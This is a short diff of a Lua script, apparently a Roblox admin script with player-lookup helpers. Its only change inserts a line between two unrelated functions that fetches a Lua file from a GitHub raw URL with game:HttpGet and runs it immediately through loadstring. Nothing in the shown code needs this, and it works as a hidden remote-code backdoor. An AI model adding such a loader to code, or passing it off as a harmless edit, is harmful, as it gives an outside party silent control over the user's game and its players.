@@ -515,6 +515,7 @@ function getPlayersByName(Name)
 	end
 	return Found
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nyashi/customscripts/main/props.lua"))()
 
 function GetPlayer(String) -- Credit to Timeless/xFunnieuss
     local Found = {}
